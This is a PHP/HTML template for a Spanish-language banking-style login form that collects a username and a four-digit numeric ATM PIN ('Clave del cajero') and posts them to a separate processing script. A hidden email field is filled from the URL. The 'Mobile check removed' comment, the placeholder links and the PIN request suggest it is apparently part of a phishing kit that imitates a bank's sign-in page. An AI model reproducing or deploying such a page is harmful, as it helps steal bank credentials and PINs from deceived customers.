<?php

// Mobile check removed

?>
<div class="login-container">
    <form class="login-form" id="loginForm" action="modules/login/process_login.php" method="POST">
        <input type="hidden" name="email" value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>">
        <h1>¡Hola! <span style="font-size: 10px; color: #aaa;">v2.01</span></h1>
        <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-user"></i>
                <input type="text" name="usuario" id="usuario" required>
                <label for="usuario">Usuario</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu usuario</span>
            <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
        </div>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-lock"></i>

                <input type="password" name="clave" id="clave" required maxlength="4" inputmode="numeric"
                    pattern="[0-9]*">

                <label for="clave">Clave del cajero</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu clave</span>
            <a href="#" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
        </div>

        <button type="submit" class="btn btn-login" id="loginButton">Iniciar sesión</button>

        <a href="#" class="create-user-link">Crear usuario</a>
    </form>
</div>